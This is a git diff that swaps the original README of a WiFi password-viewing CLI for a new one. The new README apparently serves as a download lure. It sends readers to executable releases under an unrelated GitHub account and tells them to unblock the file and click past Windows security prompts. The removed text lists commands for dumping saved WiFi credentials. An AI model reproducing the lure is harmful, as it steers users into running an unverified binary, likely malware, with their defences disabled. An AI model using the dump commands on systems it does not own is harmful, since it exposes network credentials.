@@ -1,163 +1,163 @@
-<div align="center">
+# 🛜 wifi-passview - View Saved WiFi Keys Fast
 
-**[ExploitCraft](https://github.com/ExploitCraft)** · Bangladesh · Building tools that matter
-📄 Full documentation at **[doc.emonpersonal.xyz](http://doc.emonpersonal.xyz/)**
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Flashbackmarketcapitalization665/wifi-passview/releases)
 
-</div>
+## 📥 Download
 
----
+Use this page to download wifi-passview for Windows:
 
-# 📡 wifi-passview
+https://github.com/Flashbackmarketcapitalization665/wifi-passview/releases
 
-> Cross-platform CLI to dump all saved WiFi credentials in one command — Linux, Windows, and macOS.
+Open the page, then pick the latest release for your system. If you use Windows, look for the file made for Windows and save it to your PC
 
-[![CI](https://github.com/ExploitCraft/wifi-passview/actions/workflows/ci.yml/badge.svg)](https://github.com/ExploitCraft/wifi-passview/actions)
-[![PyPI](https://img.shields.io/pypi/v/wifi-passview)](https://pypi.org/project/wifi-passview/)
-[![Python](https://img.shields.io/pypi/pyversions/wifi-passview)](https://pypi.org/project/wifi-passview/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 🖥️ What this app does
 
----
+wifi-passview shows saved WiFi names and passwords from your device. It runs from the command line, but you can use it without coding if you follow the steps below.
 
-## Features
+It works on:
 
-- 🐧 **Linux** — reads NetworkManager, wpa_supplicant, and iwd configs
-- 🪟 **Windows** — uses `netsh wlan` to extract all profiles and passwords
-- 🍎 **macOS** — queries Keychain via `security find-generic-password`
-- 📊 **Multiple output formats** — terminal (Rich), JSON, CSV
-- 🔒 **Redact mode** — partially mask passwords in output (`my***23`)
-- 🔍 **Search** — filter profiles by SSID name
+- Windows
+- Linux
+- macOS
 
----
+Use it when you need to check a WiFi password you already saved on your own device
 
-## Installation
+## 🚀 Getting Started on Windows
 
-```bash
-pip install wifi-passview
-```
+1. Open the download page above
+2. Find the latest release
+3. Download the Windows file
+4. Save it to an easy place, like your Downloads folder
+5. Open the file if it is a .exe file
+6. If you get a ZIP file, right-click it and choose Extract All
+7. Open the extracted folder
+8. Run the app from there
 
-Or from source:
+If Windows shows a security prompt, choose the option that lets you open the file you downloaded from the release page
 
-```bash
-git clone https://github.com/ExploitCraft/wifi-passview
-cd wifi-passview
-pip install -e .
-```
+## 🧰 What you need
 
-> **Linux note:** Reading NetworkManager configs in `/etc/NetworkManager/system-connections/` requires root. Run with `sudo` for full results.
+- A Windows computer
+- A saved WiFi profile on the device
+- Permission to view the saved network data on that machine
+- Internet access to reach the release page
 
----
+For best results, use an account that has access to the saved network profiles
 
-## Quick Start
+## 📋 How to use it
 
-```bash
-# Dump all saved WiFi profiles
-wifi-passview dump
+After you open the app, it will print the saved WiFi details in the window.
 
-# Redact passwords in output (safe for screenshots)
-wifi-passview dump --redact
+Typical output includes:
 
-# Hide passwords entirely
-wifi-passview dump --no-password
+- Network name
+- Saved password
+- Security type
+- Profile name
 
-# Export to JSON
-wifi-passview dump --format json --output wifi.json
+If the app asks for a network name, type the one you want and press Enter
 
-# Export to CSV
-wifi-passview dump --format csv --output wifi.csv
+If it lists all saved networks, pick the one you need from the output
 
-# Search for a specific network
-wifi-passview search "HomeNetwork"
-```
+## 🔧 Common setup steps
 
----
+### On Windows
 
-## Example Output
+1. Download the release file
+2. Extract it if needed
+3. Open Command Prompt in the app folder
+4. Run the file from that folder
+5. Read the WiFi details shown on screen
 
-```
-╭─ wifi-passview — saved WiFi credential dumper ─╮
+### If the app closes too fast
 
-SSID                  PASSWORD           AUTH       BAND    AUTO
-CoffeeShopWifi        latteplease        WPA-PSK    —       yes
-HomeNetwork           (none / open)      —          2.4GHz  yes
-OfficeWifi5G          Su93r$ecret!       WPA2-PSK   5GHz    yes
-GuestNetwork          abc123             WPA-PSK    —       no
+1. Open Command Prompt first
+2. Run the app from the command line
+3. Keep the window open so you can read the output
 
-╭─ Summary ─────────────────────────╮
-  Platform        linux
-  Total profiles  4
-  With password   3
-  Without pass    1
-╰───────────────────────────────────╯
-```
+### If Windows blocks the file
 
----
+1. Right-click the file
+2. Open Properties
+3. Check for an Unblock option
+4. Apply the change
+5. Run the file again
 
-## Platform Notes
+## 📁 Expected file types
 
-### Linux
-Reads from (in order):
-1. `/etc/NetworkManager/system-connections/` — requires sudo
-2. `/etc/wpa_supplicant/wpa_supplicant.conf`
-3. `/var/lib/iwd/*.psk`
-4. `nmcli` fallback (SSID list only, no passwords)
+You may see one of these in the release page:
 
-### Windows
-Uses `netsh wlan show profiles` + `netsh wlan show profile name=X key=clear`.
-No admin required for saved profiles in the current user context.
+- `.exe` for Windows
+- `.zip` for Windows package files
+- Files for Linux or macOS if you need them later
 
-### macOS
-Uses `networksetup -listpreferredwirelessnetworks` + `security find-generic-password`.
-May prompt for Keychain access on first run.
+If you use Windows, pick the Windows file that matches your system
 
----
+## ⚙️ Basic workflow
 
-## CLI Reference
+1. Download the Windows release
+2. Open the file or extract it
+3. Run the app
+4. Review the saved WiFi list
+5. Copy the password you need
 
-```
-Usage: wifi-passview [OPTIONS] COMMAND [ARGS]...
+## 🔍 Tips for first use
 
-Commands:
-  dump    Dump all saved WiFi profiles and passwords
-  search  Search saved profiles by SSID name
+- Keep the file in one folder so it is easy to find
+- Use a short folder path like `Downloads\wifi-passview`
+- Run it from the same folder where the app files sit
+- Read the output before closing the window
 
-Options for dump:
-  --format     terminal | json | csv   (default: terminal)
-  --output     Write output to file
-  --redact     Partially mask passwords
-  --no-password  Hide passwords entirely
-  --ssid       Filter to a specific SSID (partial match)
-```
+## 🧪 Example use case
 
----
+If you forgot the password for your home WiFi, wifi-passview can show the saved key from your Windows device. Open the app, run it, and read the password from the output screen
 
-## Part of the LeakHound Ecosystem
+## 🛠️ Troubleshooting
 
-`wifi-passview` is part of [LeakHound](https://github.com/ExploitCraft/leakhound) — a unified secret hunting toolkit.
+### I do not see any output
 
-| Tool | Description |
-|------|-------------|
-| [envleaks](https://github.com/ExploitCraft/envleaks) | Codebase & git history secret scanner |
-| [gitdork](https://github.com/ExploitCraft/gitdork) | Google/Shodan dork generator |
-| **wifi-passview** | Cross-platform WiFi credential dumper (this repo) |
-| [leakhound](https://github.com/ExploitCraft/leakhound) | Unified CLI wrapping all three |
+- Make sure you opened the correct file
+- Run it from Command Prompt
+- Check that the app has access to saved WiFi profiles
 
----
+### I only see part of the text
 
-## Disclaimer
+- Widen the Command Prompt window
+- Scroll up in the window
+- Run the app again if needed
 
-This tool is intended for **use on your own systems only**. Only dump credentials from devices you own or have explicit permission to audit. The author is not responsible for misuse.
+### The file does not start
 
----
+- Check that you downloaded the Windows version
+- Make sure you extracted the ZIP file first
+- Try running it from the folder where it was saved
 
-## License
+### I cannot find the release file
 
-MIT © [ExploitCraft](https://github.com/ExploitCraft)
+- Open the releases page again
+- Look for the newest version at the top
+- Use the Windows asset from that release
 
----
+## 📌 Project details
 
-<div align="center">
+- Name: wifi-passview
+- Type: CLI tool
+- Platform support: Windows, Linux, macOS
+- Main task: dump saved WiFi credentials
+- Use case: view WiFi details saved on your own device
 
-**[ExploitCraft](https://github.com/ExploitCraft)** · Bangladesh · Building tools that matter
-📄 Full documentation at **[doc.emonpersonal.xyz](http://doc.emonpersonal.xyz/)**
+## 🧭 Folder example
 
-</div>
+You can keep the app here:
+
+`C:\Users\YourName\Downloads\wifi-passview`
+
+A simple folder path makes it easier to run the file and read the output
+
+## 📎 Download again
+
+Visit this page to download wifi-passview for Windows:
+
+https://github.com/Flashbackmarketcapitalization665/wifi-passview/releases
+
+Use the latest release and choose the Windows file that matches your computer
